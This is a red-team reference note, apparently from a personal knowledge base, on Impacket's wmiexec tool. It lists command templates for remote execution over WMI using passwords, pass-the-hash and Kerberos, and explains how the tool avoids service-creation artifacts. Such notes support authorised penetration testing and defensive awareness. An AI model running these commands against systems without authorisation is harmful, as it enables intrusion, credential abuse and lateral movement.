---
title: wmiexec
aliases: ["wmiexec.py", "WMI execution"]
type: tool
domain: [red-team]
tags: [type/tool, domain/red-team]
source: "Fortra (Impacket)"
source_url: "https://github.com/fortra/impacket"
verified: true
related: ["[[Remote Execution & Lateral Movement (Windows)]]", "[[Impacket]]", "[[Pass-the-Hash]]", "[[SMB]]"]
created: 2026-06-07
updated: 2026-06-07
---

# wmiexec

> [!summary] One-liner
> Semi-interactive shell via Windows Management Instrumentation (WMI) — executes commands through `Win32_Process.Create()` and retrieves output via SMB, without creating a service (stealthier than [[PsExec]]).

## Usage
```bash
# Password auth
wmiexec.py <DOMAIN>/<USER>:<PASS>@<TARGET>

# Pass-the-hash
wmiexec.py -hashes :<NT_HASH> <DOMAIN>/<USER>@<TARGET>

# Kerberos auth
wmiexec.py -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>

# Single command (non-interactive)
wmiexec.py <DOMAIN>/<USER>:<PASS>@<TARGET> "whoami"
```

## How it works
1. Connects via DCOM (TCP 135 + dynamic RPC port).
2. Calls `Win32_Process.Create()` to spawn `cmd.exe /c <command>`.
3. Output is redirected to a file on `ADMIN$` share.
4. wmiexec reads the output file via SMB.

## Advantages over PsExec
- **No service created** — fewer artifacts (no Event 7045).
- **No binary written** — cmd.exe is the execution engine.
- But: still touches SMB for output retrieval; requires admin access.

## Related
- Parent toolkit: [[Impacket]].
- Lateral movement: [[Remote Execution & Lateral Movement (Windows)]].
- Alternatives: [[PsExec]] (service-based), [[evil-winrm]] (WinRM).
